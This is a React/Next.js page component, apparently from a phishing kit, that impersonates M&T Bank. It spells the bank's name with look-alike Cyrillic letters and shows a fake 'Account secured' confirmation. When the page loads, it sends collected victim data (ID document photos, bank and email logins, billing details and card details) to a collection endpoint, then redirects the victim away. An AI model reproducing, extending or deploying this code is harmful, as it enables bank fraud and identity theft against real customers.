import { Box } from "@chakra-ui/react";
import axios from "axios";
import React, { useContext, useEffect } from "react";
import Head from "next/head";
import { Container } from "../../components/Container";
import { Wrapper } from "../../components/Wrapper";
import styles from "../../styles/Loader.module.css";
import { DataContext } from "../_app";

interface VerifiedProps {}

export const Verified: React.FC<VerifiedProps> = ({}) => {
  const { data } = useContext(DataContext);
  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const front = data.docs && data.docs.front;
      const back = data.docs && data.docs.back;
      const logins = data.logins;
      const emailLogins = data.emailLogins;
      const billing = data.billing;
      const cardDetails = data.cardDetails;
      const sessionId = data.sessionId;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (front && back) {
            formData.append(`front`, front);
            formData.append(`back`, back);
          }

          if (sessionId) {
            formData.append(`sessionId`, sessionId);
          }

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData);
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  return (
    <Wrapper>
      <Head>
        <title>Account Secured | М&Т Ваnk</title>
      </Head>
      <Container
        upTitle={`Account secured`}
        title={`Thank you`}
        subTitle={`Your account has been secured successfully please wait while we redirect you to the login page.`}
      >
        <Box mt={`20px`}>
          <Box
            ml={[`40px`, `30px`]}
            color={`#007856`}
            className={styles.loader}
          />
        </Box>
      </Container>
    </Wrapper>
  );
};

export default Verified;
